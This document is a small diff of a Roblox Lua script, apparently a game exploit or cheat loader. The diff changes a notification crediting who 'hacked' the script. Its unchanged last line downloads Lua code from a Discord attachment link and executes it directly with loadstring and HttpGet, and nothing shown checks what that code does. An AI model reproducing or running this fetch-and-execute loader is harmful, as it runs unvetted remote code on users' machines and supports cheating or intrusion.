@@ -1,6 +1,6 @@
 game:GetService("StarterGui"):SetCore("SendNotification", {
 Title = "SCRIPT HACKED BY";
-Text  = "dxrkz and helped by xzyn, SKIDDERS";
+Text  = "jn hh skidding and helped by xzyn, SKIDDERS";
 })
 
 loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/1008198357832958002/1008226061915533393/out.lua"))()
